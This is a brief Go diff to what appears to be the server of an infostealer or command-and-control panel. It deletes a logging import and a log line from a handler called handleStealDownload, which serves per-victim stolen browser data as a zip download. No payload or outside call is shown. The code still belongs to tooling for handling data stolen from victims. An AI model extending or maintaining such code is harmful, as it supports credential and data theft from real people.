@@ -4,7 +4,6 @@ import (
 	"archive/zip"
 	"encoding/json"
 	"fmt"
-	"log"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -84,7 +83,6 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 
 	entries, err := os.ReadDir(browserDir)
 	if err != nil || len(entries) == 0 {
-		log.Printf("[handlers] steal-download: failed to read browser dir for %q: %v", victimID, err)
 		http.Error(w, "no steal data", http.StatusNotFound)
 		return
 	}
